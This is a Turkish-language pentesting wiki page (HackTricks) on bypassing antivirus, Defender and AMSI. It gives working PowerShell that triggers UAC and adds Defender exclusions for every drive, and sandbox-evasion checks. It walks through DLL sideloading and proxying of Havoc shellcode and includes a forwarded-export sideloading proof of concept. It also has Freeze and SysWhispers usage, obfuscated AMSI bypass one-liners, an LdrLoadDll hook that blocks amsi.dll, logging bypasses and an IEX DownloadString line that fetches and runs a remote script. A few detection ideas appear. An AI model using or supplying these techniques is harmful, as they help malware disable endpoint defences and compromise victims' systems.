# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Bu sayfa ilk olarak** [**@m2rc_p**](https://twitter.com/m2rc_p) **tarafından yazılmıştır!**

## Defender'ı Durdurma

- [defendnot](https://github.com/es3n1n/defendnot): Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
- [no-defender](https://github.com/es3n1n/no-defender): Başka bir AV'yi taklit ederek Windows Defender'ın çalışmasını durdurmaya yarayan bir tool.
- [Admin iseniz Defender'ı devre dışı bırakın](basic-powershell-for-pentesters/README.md)

### Defender'a müdahale etmeden önce Installer tarzı UAC yemi

Game cheat kılığına giren public loader'lar genellikle ilk olarak **kullanıcıdan elevation ister**, ardından Defender'ı etkisizleştiren imzasız Node.js/Nexe installer'lar olarak dağıtılır. Akış basittir:

1. `net session` ile administrative context'i kontrol edin. Komut yalnızca çağıran kişi admin haklarına sahip olduğunda başarıyla çalışır; dolayısıyla başarısız olması, loader'ın standard user olarak çalıştığını gösterir.
2. Orijinal command line'ı korurken beklenen UAC consent prompt'unu tetiklemek için kendisini hemen `RunAs` verb'üyle yeniden başlatır.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Kurbanlar zaten “cracked” yazılım yüklediklerine inandıkları için istem genellikle kabul edilir ve bu da malware’in Defender politikasını değiştirmek için ihtiyaç duyduğu yetkilere sahip olmasını sağlar.

### Her sürücü harfi için kapsamlı `MpPreference` exclusions

Yetki yükseltildikten sonra GachiLoader tarzı zincirler, servisi tamamen devre dışı bırakmak yerine Defender’ın kör noktalarını en üst düzeye çıkarır. Loader önce GUI watchdog’u (`taskkill /F /IM SecHealthUI.exe`) sonlandırır, ardından **son derece geniş exclusions** ekleyerek her kullanıcı profilinin, sistem dizininin ve çıkarılabilir diskin taranamaz hale gelmesini sağlar:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Önemli gözlemler:

- Döngü, bağlı tüm dosya sistemlerini (D:\, E:\, USB bellekler vb.) tarar; bu nedenle diskin herhangi bir yerine bırakılacak gelecekteki **payload**'lar yok sayılır.
- `.sys` uzantısı hariç tutması ileriye dönük bir önlemdir; attackers, Defender'a tekrar dokunmadan daha sonra unsigned driver'lar yükleme seçeneğini saklı tutar.
- Tüm değişiklikler `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions` altında yapılır; böylece sonraki aşamalar, UAC'yi yeniden tetiklemeden exclusions'ların kalıcı olduğunu doğrulayabilir veya bunları genişletebilir.

Hiçbir Defender service durdurulmadığından, basit health check'ler gerçek zamanlı inceleme bu paths'lere hiç uygulanmasa bile “antivirus active” bildirmeye devam eder.

## **AV Evasion Methodology**

Günümüzde AV'ler bir dosyanın malicious olup olmadığını kontrol etmek için farklı yöntemler kullanır: static detection, dynamic analysis ve daha gelişmiş EDR'ler için behavioural analysis.

### **Static detection**

Static detection, bir binary veya script içindeki bilinen malicious string'leri ya da byte dizilerini işaretleyerek ve ayrıca dosyanın kendisinden bilgiler çıkararak (ör. file description, company name, digital signatures, icon, checksum vb.) gerçekleştirilir. Bu, bilinen public tools kullanmanın daha kolay yakalanmanıza neden olabileceği anlamına gelir; çünkü bu araçlar muhtemelen analiz edilmiş ve malicious olarak işaretlenmiştir. Bu tür detection yöntemlerini aşmanın birkaç yolu vardır:

- **Encryption**

Binary'yi encrypt ederseniz AV'nin programınızı tespit etmesi mümkün olmaz; ancak programı decrypt edip memory'de çalıştırmak için bir tür loader'a ihtiyacınız olacaktır.

- **Obfuscation**

Bazen binary veya script'inizdeki bazı string'leri değiştirmeniz, AV'yi aşmanız için yeterlidir; ancak neyi obfuscate etmeye çalıştığınıza bağlı olarak bu zaman alıcı bir iş olabilir.

- **Custom tooling**

Kendi tools'larınızı geliştirirseniz bilinen bad signature'lar bulunmaz; ancak bu çok fazla zaman ve çaba gerektirir.

> [!TIP]
> Windows Defender static detection'a karşı kontrol yapmak için [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) kullanabilirsiniz. Bu araç temel olarak dosyayı birden fazla segmente böler ve ardından Defender'dan her birini ayrı ayrı scan etmesini ister; bu şekilde binary'nizde hangi string veya byte'ların işaretlendiğini tam olarak görebilirsiniz.

Pratik AV Evasion hakkında bu [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf)'ine göz atmanızı şiddetle tavsiye ederim.

### **Dynamic analysis**

Dynamic analysis, AV'nin binary'nizi bir sandbox içinde çalıştırması ve malicious activity'yi izlemesidir (ör. browser password'larınızı decrypt edip okumaya çalışma, LSASS üzerinde minidump gerçekleştirme vb.). Bu kısımla çalışmak biraz daha zor olabilir; ancak sandbox'ları evade etmek için yapabileceğiniz bazı şeyler şunlardır.

- **Sleep before execution** Nasıl implement edildiğine bağlı olarak bu, AV'nin dynamic analysis'ini bypass etmek için harika bir yöntem olabilir. AV'lerin, kullanıcının workflow'unu kesintiye uğratmamak için dosyaları scan etmek üzere çok kısa bir süresi vardır; bu nedenle uzun sleep'ler binary'lerin analysis sürecini bozabilir. Sorun şu ki birçok AV sandbox'ı, nasıl implement edildiğine bağlı olarak sleep'i atlayabilir.
- **Checking machine's resources** Sandbox'ların genellikle kullanabilecekleri kaynaklar çok azdır (ör. < 2GB RAM); aksi takdirde kullanıcının machine'ini yavaşlatabilirler. Burada oldukça creative de olabilirsiniz; örneğin CPU'nun sıcaklığını veya fan speed'lerini kontrol edebilirsiniz, çünkü sandbox'ta her şey implement edilmiş olmayacaktır.
- **Machine-specific checks** “contoso.local” domain'ine katılmış bir workstation'ı hedeflemek istiyorsanız, computer'ın domain'ini kontrol ederek belirttiğiniz domain ile eşleşip eşleşmediğine bakabilirsiniz; eşleşmiyorsa programınızdan çıkmasını sağlayabilirsiniz.

Microsoft Defender's Sandbox computername'inin HAL9TH olduğu ortaya çıktı; bu nedenle detonation'dan önce malware'inizde computer name'i kontrol edebilirsiniz. İsim HAL9TH ile eşleşiyorsa Defender's sandbox'ının içinde olduğunuz anlamına gelir; bu durumda programınızdan çıkmasını sağlayabilirsiniz.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Sandboxes'a karşı kullanılabilecek [@mgeeky](https://twitter.com/mariuszbit)'den bazı diğer çok iyi ipuçları

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Bu post'ta daha önce söylediğimiz gibi, **public tools** er ya da geç **detected** olacaktır; bu nedenle kendinize şu soruyu sormalısınız:

Örneğin LSASS dump etmek istiyorsanız, **gerçekten mimikatz kullanmanız gerekiyor mu**? Yoksa daha az bilinen ve LSASS'ı dump eden farklı bir project kullanabilir misiniz?

Doğru cevap muhtemelen ikincisidir. mimikatz'ı örnek olarak ele alırsak, muhtemelen AV'ler ve EDR'ler tarafından en çok flag'lenen malware'lerden biridir; project'in kendisi oldukça etkileyici olsa da AV'leri aşmak için onunla çalışmak bir nightmare'dir. Bu nedenle gerçekleştirmeye çalıştığınız işlem için alternatives arayın.

> [!TIP]
> Payload'larınızı evasion için modifiye ederken Defender'da **automatic sample submission'ı kapattığınızdan** emin olun ve lütfen, uzun vadede evasion elde etmek istiyorsanız **VIRUSTOTAL'A UPLOAD ETMEYİN**. Payload'ınızın belirli bir AV tarafından detected olup olmadığını kontrol etmek istiyorsanız AV'yi bir VM'ye kurun, automatic sample submission'ı kapatmayı deneyin ve sonuçtan memnun kalana kadar testlerinizi orada gerçekleştirin.

## EXEs vs DLLs

Mümkün olduğunda evasion için her zaman **DLL kullanmaya öncelik verin**; benim deneyimime göre DLL files genellikle **çok daha az detected** olur ve analiz edilir. Bu nedenle, bazı durumlarda detection'dan kaçınmak için kullanabileceğiniz çok basit bir trick'tir (elbette payload'ınızın DLL olarak çalıştırılabilmesi gerekir).

Bu image'da görebileceğimiz gibi, Havoc'tan bir DLL Payload'ın antiscan.me üzerindeki detection rate'i 4/26 iken EXE payload'ın detection rate'i 7/26'dır.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Şimdi DLL files ile kullanabileceğiniz ve çok daha stealthier olmanızı sağlayacak bazı trick'leri göstereceğiz.

## DLL Sideloading & Proxying

**DLL Sideloading**, hem victim application'ı hem de malicious payload(lar)ı yan yana konumlandırarak loader tarafından kullanılan DLL search order'dan yararlanır.

DLL Sideloading'e susceptible program'ları [Siofra](https://github.com/Cybereason/siofra) ve aşağıdaki powershell script'i kullanarak kontrol edebilirsiniz:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Bu komut, "C:\Program Files\\" içindeki DLL hijacking'e karşı savunmasız programların ve yüklemeyi denedikleri DLL dosyalarının listesini çıktılar.

**DLL Hijackable/Sideloadable programs**'ları kendiniz **explore etmenizi** kesinlikle öneririm. Bu teknik doğru uygulandığında oldukça stealthy'dir; ancak publicly known DLL Sideloadable programs kullanırsanız kolayca yakalanabilirsiniz.

Bir programın yüklemeyi beklediği ada sahip malicious bir DLL yerleştirmek payload'unuzu çalıştırmaz; çünkü program bu DLL'in içinde belirli işlevlerin bulunmasını bekler. Bu sorunu çözmek için **DLL Proxying/Forwarding** adı verilen başka bir teknik kullanacağız.

**DLL Proxying**, bir programın proxy (ve malicious) DLL'e yaptığı çağrıları original DLL'e yönlendirir. Böylece programın işlevselliği korunur ve payload'unuzun çalıştırılmasını yönetebilirsiniz.

[@flangvik](https://twitter.com/Flangvik) tarafından geliştirilen [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) projesini kullanacağım.

İzlediğim adımlar şunlardı:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Son komut bize 2 dosya verecek: bir DLL kaynak kodu şablonu ve yeniden adlandırılmış orijinal DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Bunlar sonuçlar:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Hem [SGN](https://github.com/EgeBalci/sgn) ile encode edilmiş shellcode'umuzun hem de proxy DLL'in [antiscan.me](https://antiscan.me) üzerinde 0/26 Detection rate'i var! Buna başarı derdim.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> DLL Sideloading hakkında [S3cur3Th1sSh1t's twitch VOD'unu](https://www.twitch.tv/videos/1644171543) ve ayrıca daha önce tartıştıklarımızı daha detaylı öğrenmek için [ippsec'in videosunu](https://www.youtube.com/watch?v=3eROsG_WNpE) izlemenizi **şiddetle tavsiye ederim**.

### Forwarded Exports'ı Abusing Etme (ForwardSideLoading)

Windows PE modülleri, aslında "forwarder" olan fonksiyonları export edebilir: export entry, code'a işaret etmek yerine `TargetDll.TargetFunc` biçiminde bir ASCII string içerir. Bir caller export'u resolve ettiğinde Windows loader:

- Henüz load edilmemişse `TargetDll`'yi load eder
- `TargetFunc`'yi ondan resolve eder

Anlaşılması gereken temel davranışlar:
- `TargetDll` bir KnownDLL ise, korumalı KnownDLLs namespace'inden (ör. ntdll, kernelbase, ole32) sağlanır.
- `TargetDll` bir KnownDLL değilse normal DLL search order kullanılır; buna forward resolution gerçekleştiren modülün directory'si de dahildir.

Bu, indirect bir sideloading primitive'i mümkün kılar: bir non-KnownDLL module name'e forward edilmiş bir function export eden signed DLL bulun ve bu signed DLL'yi, forwarded target module ile tam olarak aynı ada sahip attacker-controlled bir DLL ile aynı directory'ye yerleştirin. Forwarded export invoke edildiğinde loader forward'ı resolve eder ve DLL'inizi aynı directory'den load ederek DllMain'inizi execute eder.

Windows 11'de gözlemlenen örnek:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` bir KnownDLL değildir, bu nedenle normal arama sırasına göre çözümlenir.

PoC (kopyala-yapıştır):
1) İmzalı sistem DLL'sini yazılabilir bir klasöre kopyalayın
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Aynı klasöre kötü amaçlı bir `NCRYPTPROV.dll` bırakın. Code execution elde etmek için minimal bir DllMain yeterlidir; DllMain'i tetiklemek için forwarded function'ı uygulamanız gerekmez.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) İletmeyi imzalı bir LOLBin ile tetikleyin:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Gözlemlenen davranış:
- rundll32 (signed), side-by-side `keyiso.dll` (signed) dosyasını yükler
- `KeyIsoSetAuditingInterface` çözümlenirken loader, `NCRYPTPROV.SetAuditingInterface` yönlendirmesini takip eder
- Ardından loader, `C:\test` konumundaki `NCRYPTPROV.dll` dosyasını yükler ve `DllMain` işlevini çalıştırır
- `SetAuditingInterface` uygulanmamışsa, "missing API" hatasını yalnızca `DllMain` zaten çalıştıktan sonra alırsınız

Hunting ipuçları:
- Hedef modülün KnownDLL olmadığı forwarded export'lara odaklanın. KnownDLL'ler `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` altında listelenir.
- Forwarded export'ları aşağıdaki gibi araçlarla enumerate edebilirsiniz:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Adayları aramak için Windows 11 forwarder envanterine bakın: https://hexacorn.com/d/apis_fwd.txt

Tespit/savunma fikirleri:
- LOLBins'leri (ör. `rundll32.exe`) system dışı yollardan imzalı DLL'ler yüklerken ve ardından aynı temel ada sahip, `KnownDLLs` içinde bulunmayan DLL'leri bu dizinden yüklerken izleyin
- Şu tür işlem/modül zincirleri için uyarı oluşturun: kullanıcı tarafından yazılabilir yollar altında `rundll32.exe` → system dışı `keyiso.dll` → `NCRYPTPROV.dll`
- Code integrity policy'lerini (WDAC/AppLocker) uygulayın ve uygulama dizinlerinde write+execute işlemlerini engelleyin

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze, askıya alınmış process'ler, direct syscalls ve alternatif execution yöntemlerini kullanarak EDR'leri bypass etmeye yönelik bir payload toolkit'idir`

Freeze'i shellcode'unuzu stealthy bir şekilde yüklemek ve execute etmek için kullanabilirsiniz.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion yalnızca bir kedi-fare oyunudur; bugün çalışan bir şey yarın detect edilebilir. Bu nedenle hiçbir zaman yalnızca tek bir araca güvenmeyin, mümkünse birden fazla evasion tekniğini zincirlemeyi deneyin.

## Direct/Indirect Syscalls ve SSN Resolution (SysWhispers4)

EDR'ler sıklıkla `ntdll.dll` syscall stub'larına **user-mode inline hook'lar** yerleştirir. Bu hook'ları bypass etmek için, doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect syscall stub'ları** oluşturabilirsiniz.

**Invocation seçenekleri:**
- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` instruction'ı ekler (`ntdll` export'una erişilmez).
- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanmış gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir pool içinden gadget seçer.
- **Egg-hunt**: Statik `0F 05` opcode dizisini disk üzerinde embed etmekten kaçınır; bir syscall sequence'ını runtime sırasında resolve eder.

**Hook-resistant SSN resolution stratejileri:**
- **FreshyCalls (VA sort)**: SSN'leri stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak çıkarır.
- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` map'ler, SSN'leri `.text` bölümünden okur, ardından map'i kaldırır (bellek içindeki tüm hook'ları bypass eder).
- **RecycledGate**: VA-sorted SSN inference'ı, stub temiz olduğunda opcode validation ile birleştirir; hook varsa VA inference'a geri döner.
- **HW Breakpoint**: `syscall` instruction'ı üzerinde DR0 ayarlar ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.

SysWhispers4 kullanım örneği:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehditlerini önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları herhangi bir şekilde **doğrudan bellekte** çalıştırabilirseniz, AV yeterli görünürlüğe sahip olmadığından bunu önlemek için hiçbir şey yapamıyordu.

AMSI özelliği, Windows'un şu bileşenlerine entegre edilmiştir.

- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
- PowerShell (script'ler, etkileşimli kullanım ve dynamic code evaluation)
- Windows Script Host (wscript.exe ve cscript.exe)
- JavaScript ve VBScript
- Office VBA macro'ları

Antivirus çözümlerinin script içeriklerini hem şifrelenmemiş hem de obfuscation uygulanmamış biçimde sunarak script davranışlarını incelemesine olanak tanır.

`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender üzerinde aşağıdaki alert'i oluşturur.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

`amsi:` önekini ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu örnekte executable powershell.exe'dir.

Diske herhangi bir dosya bırakmadık, ancak yine de AMSI nedeniyle bellekte yakalandık.

Ayrıca, **.NET 4.8**'den itibaren C# code da AMSI üzerinden çalıştırılır. Bu durum, bellekte execution yüklemek için `Assembly.Load(byte[])` kullanımını bile etkiler. Bu nedenle, AMSI'dden kaçınmak istiyorsanız bellekte execution için daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.

AMSI'yi aşmanın birkaç yolu vardır:

- **Obfuscation**

AMSI esas olarak static detection'larla çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yöntem olabilir.

Ancak AMSI, birden fazla katman olsa bile script'lerin obfuscation'ını kaldırma yeteneğine sahiptir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da AMSI'den kaçınmayı çok straightforward olmayan bir işlem haline getirir. Bununla birlikte bazen yalnızca birkaç variable adını değiştirmeniz yeterli olabilir; bu nedenle durum, bir şeyin ne ölçüde flag'lendiğine bağlıdır.

- **AMSI Bypass**

AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek implement edildiğinden, unprivileged user olarak çalışırken bile kolayca üzerinde oynama yapılabilir. AMSI implementasyonundaki bu flaw nedeniyle araştırmacılar, AMSI scanning'den kaçınmak için birden fazla yöntem bulmuştur.

**Forcing an Error**

AMSI initialization'ını başarısız olmaya zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasını sağlar. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, daha geniş kullanımını önlemek için bir signature geliştirdi.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Mevcut PowerShell process'i için AMSI'yi kullanılamaz hâle getirmek yalnızca tek satırlık PowerShell kodu gerektirdi. Elbette bu satır AMSI tarafından da flag'lendi, bu nedenle bu tekniği kullanabilmek için bazı değişiklikler yapılması gerekiyor.

İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) üzerinden aldığım değiştirilmiş AMSI bypass.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Bunu aklınızda bulundurun: Bu gönderi yayınlandığında büyük olasılıkla flag'lenecektir; bu nedenle amacınız undetected kalmaksa herhangi bir code yayınlamamalısınız.

**Memory Patching**

Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir. Teknik, amsi.dll içindeki `"AmsiScanBuffer"` function'ının (kullanıcı tarafından sağlanan input'u taramaktan sorumludur) adresini bulmayı ve bu adresi `E_INVALIDARG` code'unu döndürecek instructions ile overwrite etmeyi içerir. Böylece gerçek scan'in sonucu 0 döner ve bu değer temiz bir sonuç olarak yorumlanır.

> [!TIP]
> Daha detaylı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.

AMSI'yi powershell ile bypass etmek için kullanılan birçok başka teknik de vardır. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.

### amsi.dll yüklemesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)

AMSI yalnızca `amsi.dll` mevcut process'e yüklendikten sonra initialize edilir. Sağlam ve language-agnostic bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine, istenen module `amsi.dll` olduğunda error döndüren bir user-mode hook yerleştirmektir. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu process için scan gerçekleşmez.

Implementation outline (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notlar
- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
- Uzun command-line artefact'larını önlemek için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
- LOLBins üzerinden çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `regsvr32` tarafından `DllRegisterServer` çağrılması).

**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script oluşturur.
**[https://amsibypass.com/](https://amsibypass.com/)** aracı da randomized user-defined function, variables, characters expression kullanarak ve signature'ı önlemek için PowerShell keyword'lerinde random character casing uygulayarak signature'ı önleyen AMSI bypass script'leri oluşturur.

**Tespit edilen signature'ı kaldırma**

Mevcut process'in memory'sinden tespit edilen AMSI signature'ını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, mevcut process'in memory'sini AMSI signature'ı için tarar ve ardından signature'ı NOP instruction'larıyla üzerine yazarak memory'den etkili şekilde kaldırır.

**AMSI kullanan AV/EDR ürünleri**

AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde bulabilirsiniz.

**PowerShell version 2 kullanın**
PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını loglamanızı sağlayan bir özelliktir. Bu özellik denetim ve sorun giderme amaçlarıyla faydalı olabilir; ancak **tespitten kaçmak isteyen saldırganlar için bir sorun oluşturabilir**.

PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:

- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir tool kullanabilirsiniz.
- **Powershell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
- **Unmanaged Powershell Session kullanma**: Savunmalar olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (`Cobal Strike` tarafından kullanılan `powerpick` de bunu yapar).


## Obfuscation

> [!TIP]
> Birçok obfuscation tekniği verileri şifrelemeye dayanır. Bu, binary'nin entropy'sini artırarak AV'lerin ve EDR'ların onu tespit etmesini kolaylaştırır. Buna dikkat edin ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı düşünün.

### ConfuserEx ile Korunan .NET Binary'lerini Deobfuscate Etme

ConfuserEx 2 (veya ticari fork'larını) kullanan malware'leri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, daha sonra dnSpy veya ILSpy gibi tool'larda C#'a decompile edilebilecek **orijinale yakın bir IL'yi** güvenilir şekilde geri yükler.

1. Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve şifresini *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını patch'ler; bu nedenle herhangi bir değişiklik binary'nin crash olmasına neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Output, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.

2. Symbol / control-flow recovery – *clean* file'ı **de4dot-cex**'e (ConfuserEx-aware bir de4dot fork'u) verin.
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – ConfuserEx 2 profile'ını seçer
